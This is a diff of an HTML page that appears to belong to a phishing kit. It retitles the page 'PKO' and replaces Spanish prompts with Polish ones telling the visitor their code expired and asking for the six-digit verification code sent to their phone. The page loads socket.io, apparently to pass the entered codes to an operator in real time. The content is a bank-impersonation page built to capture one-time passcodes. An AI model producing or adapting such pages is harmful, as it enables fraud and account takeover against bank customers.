@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Código Incorrecto</title>
+  <title>PKO</title>
   <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css">
   <style>
@@ -82,15 +82,15 @@
 </head>
 <body>
   <div class="screen">
-    <h3>Te enviaremos el codigo SMS a su correo electronico.</h3>
-    <p>Introduce el codigo de verificacion que te acabamos de enviar a su correo electronico.</p>
+    <h3>NIEPOPRAWNY KOD WYGASŁ. WPISZ GO POPRAWNIE.</h3>
+    <p>Wprowadź kod weryfikacyjny, który właśnie wysłaliśmy na Twój zaufany telefon.</p>
     <div class="input-group campo-requerido">
       <div class="icon"><i class="fas fa-key"></i></div>
       <input type="tel" id="codigo" placeholder="Código de verificación" pattern="[0-9]*" inputmode="numeric" minlength="6" maxlength="6" required>
     </div>
-    <p class="mensaje-error">Código inválido. Por favor, ingrese el código correctamente que fue enviado a su correo electronico.</p>
-    <h6>Recuerde revisar su bandeja de <strong>SPAM</strong> su codigo pudo haber llegado ahi.</h6>
-    <button onclick="reintentarCodigo()">Reintentar</button>
+    <p class="mensaje-error">Nieprawidłowy kod. Proszę poprawnie wpisać kod wysłany na Twój telefon..</p>
+   
+    <button onclick="reintentarCodigo()">Kontynuować</button>
   </div>
 
   <script src="/socket.io/socket.io.js"></script>
